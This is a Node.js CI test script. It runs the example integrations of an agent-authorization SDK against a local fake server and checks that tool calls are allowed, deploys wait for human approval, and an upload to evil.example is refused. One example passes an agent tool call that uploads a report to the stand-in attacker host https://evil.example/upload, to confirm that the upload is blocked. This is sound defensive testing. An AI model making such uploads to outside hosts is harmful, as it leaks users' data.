#!/usr/bin/env node
/**
 * Runs every example against the fake Immiscible, as CI does, and checks
 * what each one prints. No account and no network beyond 127.0.0.1, except
 * `npm install` for the examples that use a framework.
 *
 *   node test.mjs                    # every example
 *   node test.mjs node curl          # some of them
 *
 * The fake is the SDK's own (packages/immiscible-js, built), started here
 * with its default rules: a tool call is allowed, anything that deploys
 * waits for a person, and evil.example is refused. This script plays the
 * person and approves whatever waits. Each example uses the SDK in this
 * repository, not the one on npm: its node_modules/@immiscible/sdk is a link
 * to packages/immiscible-js, and Python finds packages/immiscible-py.
 *
 * The framework packages (@openai/agents, LangChain) are installed into the
 * example's own folder. They are never a dependency of any Immiscible package.
 */

import { spawn } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, rmSync, symlinkSync } from 'node:fs';
import path from 'node:path';
import { fileURLToPath, pathToFileURL } from 'node:url';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const PACKAGES = path.resolve(HERE, '..');
const SDK = path.join(PACKAGES, 'immiscible-js');
const TESTING = path.join(SDK, 'dist', 'esm', 'testing.js');
const PYTHON = process.env.PYTHON ?? (process.platform === 'win32' ? 'python' : 'python3');

if (!existsSync(TESTING)) {
  console.error(`The SDK is not built: ${TESTING} is missing. Run npm ci && npm run build in packages/immiscible-js.`);
  process.exit(1);
}
const { startFakeImmiscible } = await import(pathToFileURL(TESTING).href);

function sh(cmd, args, { cwd, env = {}, timeout = 120_000 } = {}) {
  return new Promise((resolve) => {
    const child = spawn(cmd, args, { cwd, env: { ...process.env, ...env }, stdio: ['ignore', 'pipe', 'pipe'], shell: process.platform === 'win32' });
    let out = '';
    child.stdout.on('data', (d) => { out += d; });
    child.stderr.on('data', (d) => { out += d; });
    const timer = setTimeout(() => child.kill('SIGKILL'), timeout);
    child.on('close', (code) => { clearTimeout(timer); resolve({ code, out }); });
  });
}

/** npm install the example's framework packages once, then point @immiscible/sdk at this repository's SDK. */
async function nodeDeps(dir) {
  const pkg = JSON.parse(readFileSync(path.join(dir, 'package.json'), 'utf8'));
  const others = Object.keys(pkg.dependencies ?? {}).filter((d) => d !== '@immiscible/sdk');
  if (others.length && !others.every((d) => existsSync(path.join(dir, 'node_modules', d)))) {
    const r = await sh('npm', ['install', '--no-audit', '--no-fund', '--no-package-lock', ...others], { cwd: dir, timeout: 300_000 });
    if (r.code !== 0) throw new Error(`npm install in ${path.basename(dir)} failed:\n${r.out}`);
  }
  const link = path.join(dir, 'node_modules', '@immiscible', 'sdk');
  mkdirSync(path.dirname(link), { recursive: true });
  rmSync(link, { recursive: true, force: true });
  symlinkSync(SDK, link, 'junction');
}

/** What each example runs, and what it must print, in order. */
const EXAMPLES = {
  node: {
    setup: (dir) => nodeDeps(dir),
    run: ['node', ['index.mjs']],
    expect: [/^allowed: Look up invoice 0931 in the books$/m, /^waiting for a person: /m, /^allowed by a person: Deploy the api service$/m, /^denied: Upload the month-end report: no mandate lets this agent reach evil\.example$/m],
  },
  python: {
    run: [PYTHON, ['main.py']],
    env: { PYTHONPATH: path.join(PACKAGES, 'immiscible-py') },
    expect: [/^allowed: Look up invoice 0931 in the books$/m, /^waiting for a person: /m, /^allowed by a person: Deploy the api service$/m, /^denied: Upload the month-end report: no mandate lets this agent reach evil\.example$/m],
  },
  curl: {
    run: ['sh', ['authorize.sh']],
    expect: [/"decision":"approval_required"/, /^allowed: act_\w+$/m, /"status":"completed"/],
  },
  'openai-agents': {
    setup: (dir) => nodeDeps(dir),
    run: ['node', ['agent.mjs', 'CALL lookup_invoice {"number":"0931"}', 'CALL deploy {"service":"api"}', 'CALL upload_report {"url":"https://evil.example/upload"}']],
    expect: [/^done: invoice 0931: £1,250\.00/m, /^waiting for a person: /m, /^done: deployed api$/m, /^done: Immiscible refused this action: no mandate lets this agent reach evil\.example\. Do not proceed/m],
  },
  langchain: {
    setup: (dir) => nodeDeps(dir),
    run: ['node', ['graph.mjs']],
    expect: [/^lookup_invoice: invoice 0931: £1,250\.00/m, /^waiting for a person: /m, /^deploy: deployed api$/m, /^upload_report: Immiscible refused this action: no mandate lets this agent reach evil\.example\. Do not proceed/m],
  },
  mcp: { check: checkMcp },
  'agentcore-interceptor': {
    run: ['node', ['check.mjs']],
    expect: [
      /^tools\/list: passed to the target$/m,
      /^lookup_invoice: passed to the target$/m,
      /^deploy, no wait: answered by the gateway: Immiscible needs a person to approve this: .* Approve or deny at /m,
      /^deploy, waiting for a person: passed to the target$/m,
      /^upload_report: answered by the gateway: Immiscible refused this: no mandate lets this agent reach evil\.example\. Do not try it another way\.$/m,
      /^response: answered by the gateway: \{"jsonrpc":"2\.0","id":1,"result":\{"tools":\[\]\}\}$/m,
      /^unreachable: answered by the gateway: Immiscible \(failing closed\): Immiscible could not be reached/m,
    ],
  },
};

/** The MCP configs: Claude Code's matches the CLI, Claude Desktop's runs the bridge, and the proxy config works end to end. */
async function checkMcp(dir, fake) {
  const read = (f) => JSON.parse(readFileSync(path.join(dir, f), 'utf8'));
  const { mcpSetups } = await import(pathToFileURL(path.join(PACKAGES, 'immiscible-cli', 'src', 'commands', 'mcp.mjs')).href);
  const cli = JSON.parse(mcpSetups('https://immiscible.ai')['claude-code'].config);
  if (JSON.stringify(read('.mcp.json')) !== JSON.stringify(cli)) throw new Error('.mcp.json differs from what npx immiscible mcp --client claude-code prints');

  const desktop = read('claude_desktop_config.json').mcpServers.immiscible;
  const bridge = desktop.args[0].replace(/^.*\/packages\//, `${PACKAGES}/`);
  if (desktop.command !== 'node' || !existsSync(bridge)) throw new Error(`claude_desktop_config.json does not run the bridge: ${desktop.args[0]}`);
  if (!desktop.env.IMMISCIBLE_URL || !desktop.env.IMMISCIBLE_AGENT_KEY) throw new Error('claude_desktop_config.json needs IMMISCIBLE_URL and IMMISCIBLE_AGENT_KEY');

  // proxy.mcp.json, pointed at the fake's proxy, as Claude Code would use it.
  const shop = read('proxy.mcp.json').mcpServers.shop;
  const url = `${fake.url}${new URL(shop.url).pathname.replace(/[^/]+$/, 'fake-shop')}`;
  const auth = shop.headers.Authorization.replace('${IMMISCIBLE_AGENT_KEY}', fake.agentKey);
  let session = null;
  let id = 0;
  const rpc = async (method, params) => {
    const res = await fetch(url, { method: 'POST', headers: { authorization: auth, 'content-type': 'application/json', accept: 'application/json, text/event-stream', ...(session ? { 'mcp-session-id': session } : {}) }, body: JSON.stringify({ jsonrpc: '2.0', id: ++id, method, params }) });
    session ??= res.headers.get('mcp-session-id');
    return res.json();
  };
  const lines = [];
  await rpc('initialize', { protocolVersion: '2025-06-18', capabilities: {}, clientInfo: { name: 'examples', version: '1' } });
  lines.push(`tools: ${(await rpc('tools/list', {})).result.tools.map((t) => t.name).join(', ')}`);
  const search = await rpc('tools/call', { name: 'search', arguments: { q: 'paper' } });
  lines.push(`search: ${search.result.content[0].text}`);
  const held = await rpc('tools/call', { name: 'buy', arguments: { amount: 9000, merchant: 'shop.example' } });
  lines.push(`buy £90: ${held.result.structuredContent.decision}`);
  const refused = await rpc('tools/call', { name: 'buy', arguments: { amount: 20000, merchant: 'shop.example' } });
  lines.push(`buy £200: error ${refused.error.code}: ${refused.error.message}`);
  const out = lines.join('\n');
  for (const re of [/^tools: search, buy$/m, /^search: fake-shop did search/m, /^buy £90: approval_required$/m, /^buy £200: error -32003: Immiscible refused/m]) {
    if (!re.test(out)) throw new Error(`expected ${re} in:\n${out}`);
  }
  return out;
}

const only = process.argv.slice(2);
for (const name of only) if (!EXAMPLES[name]) { console.error(`No example called ${name}. Examples: ${Object.keys(EXAMPLES).join(', ')}`); process.exit(2); }
const fake = await startFakeImmiscible();
// The person: approve whatever waits. In real life this is a tap in Slack or on a phone.
const person = setInterval(() => {
  for (const a of fake.actions.values()) if (a.decision === 'approval_required' && !String(a.request?.summary ?? '').includes('through the proxy')) fake.approve(a.id);
}, 50);
const env = { IMMISCIBLE_URL: fake.url, IMMISCIBLE_AGENT_KEY: fake.agentKey, NO_COLOR: '1' };

let failed = 0;
for (const [name, ex] of Object.entries(EXAMPLES)) {
  if (only.length && !only.includes(name)) continue;
  const dir = path.join(HERE, name);
  const started = Date.now();
  try {
    let out;
    if (ex.check) {
      out = await ex.check(dir, fake);
    } else {
      await ex.setup?.(dir);
      const r = await sh(ex.run[0], ex.run[1], { cwd: dir, env: { ...env, ...(ex.env ?? {}) } });
      out = r.out;
      if (r.code !== 0) throw new Error(`exit ${r.code}:\n${out}`);
      let at = 0;
      for (const re of ex.expect) {
        const m = re.exec(out.slice(at));
        if (!m) throw new Error(`expected ${re} after what came before, in:\n${out}`);
        at += m.index + m[0].length;
      }
    }
    console.log(`ok ${name} (${Date.now() - started} ms)`);
    if (process.env.VERBOSE) console.log(out.replace(/^/gm, '  '));
  } catch (err) {
    failed++;
    console.log(`not ok ${name}\n${String(err.message).replace(/^/gm, '  ')}`);
  }
}
clearInterval(person);
await fake.close();
process.exit(failed ? 1 : 0);
